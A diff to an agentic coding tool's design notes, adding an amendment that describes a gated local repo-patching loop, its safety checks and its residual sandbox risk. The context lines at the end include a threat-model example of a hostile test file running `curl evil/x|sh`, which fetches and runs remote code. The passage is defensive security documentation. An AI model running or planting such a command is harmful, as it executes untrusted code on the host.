@@ -213,6 +213,58 @@ narrower and more precise reason than "nothing executes":
   exist yet — three independently-shipped, independently-tested, independently
   gated pieces do, each smaller than the pipeline the first amendment
   described, and none of them wired to either of the others.
+
+  **[Third amendment: that pipeline now exists.]** `agentic/real_repo_loop.py::
+  run_real_repo_loop` is the fusion the second amendment said didn't exist yet,
+  and the first live caller of `run_verification` in this codebase. What it
+  actually does, precisely: clone a real repository (`RepoWorkspaceTools`),
+  ask the configured local model for a patch, write each proposed file through
+  `RepoWorkspaceTools.write_file` (new in this change — the write-side
+  counterpart to its existing reads, same path-safety validation as the git
+  ops), run the CALLER'S declared verification checks against the real
+  worktree, and — only on acceptance — `checkout_branch`/`add`/`commit` inside
+  the same clone. Still local only: no `push`, no PR, no GitHub API call.
+
+  What is gated, and how, stated exactly rather than "it's gated":
+
+  - Three conditions checked once at the top of the run, mirroring
+    `agentic/writer.py`'s own "no anonymous mutations" shape:
+    `deepagent_github.allow_git_write_tools` is `True`, a non-empty human
+    `reason` string, and explicit `confirm=True`. Each of `write_file`/`add`/
+    `commit` ALSO re-checks `allow_git_write_tools` independently — the
+    upfront check exists to fail fast (before spending a model call and a
+    verification run), not to replace the low-level ones.
+  - Every proposed file's content is injection-scanned
+    (`inspect_candidate_text`) before verification runs; a critical finding
+    skips verification entirely (no point running tests against known-bad
+    content) and forces rejection.
+  - Verification `checks` are a REQUIRED caller argument, never defaulted —
+    `agentic.executor.default_checks()` assumes this repository's own
+    toolchain (a CyClaw-specific invariant-guard path) and would be a wrong,
+    invented assumption for an arbitrary configured target. An empty check
+    list is rejected outright rather than silently accepting everything.
+  - The git commit message is always a caller-supplied fixed string, never
+    raw model output — the one place in this pipeline that deliberately does
+    NOT trust the planner's own words.
+
+  **The residual risk is real, and is exactly the executor's own risk,
+  inherited unchanged.** `run_verification`'s environment scrub is still a
+  soft, software-only control (§4's bullet above); it does not become a
+  hard sandbox by having a real caller. A verification check that itself
+  executes attacker-shaped code (a hostile test file the model proposed, that
+  the caller's own declared checks happen to run) carries the same residual
+  as before — jailed worktree, scrubbed env, wall-clock timeout, no inherited
+  secrets, no raw-socket defense. An operator should read "accepted" as "the
+  checks I named passed against this patch," not as "this patch is safe" —
+  the human `reason` and `confirm` gates exist so that reading is a deliberate
+  choice, not an assumption baked into the tooling.
+
+  **What still does not exist:** no CLI subcommand, HTTP route, or background
+  caller invokes `run_real_repo_loop` — it ships fully tested and standalone,
+  the same deferred-wiring call made for every prior capability in this
+  effort. No cloud-provider planner is wired here either (still local-only,
+  `LocalProposerClient`). Those remain explicit future work, not silently
+  implied to already exist.
 - **The residual risk this changes is real and is named, not hidden.** A
   hostile test file (e.g. one line reading `os.system("curl evil/x|sh")`)
   genuinely can attempt to run arbitrary code within the executor subprocess's
